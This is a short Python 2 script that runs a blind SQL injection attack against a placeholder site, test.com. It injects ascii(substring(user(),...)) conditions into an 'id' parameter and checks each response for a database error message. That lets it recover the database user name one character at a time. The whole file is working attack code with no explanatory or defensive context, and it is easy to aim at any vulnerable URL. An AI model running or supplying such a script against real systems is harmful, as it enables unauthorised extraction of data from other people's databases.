#!/usr/bin/env python
# coding=utf-8
#code by Lucifer
import re
import sys
import time
import warnings
import requests

warnings.filterwarnings("ignore")
reload(sys)
sys.setdefaultencoding('utf-8')
headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

key = ""

for j in range(1, 22, 1):
    for i in range(60, 130, 1):
        url = "http://test.com/index.php?id=31%20and%20ascii(substring(user(),"+str(j)+",1))="+str(i)
        req = requests.get(url, headers=headers, timeout=20, verify=False)
        if req.text.find("You have an error") is -1:
            key += chr(i)
            break
        else:
            pass
    time.sleep(1)
    print "user:"+key
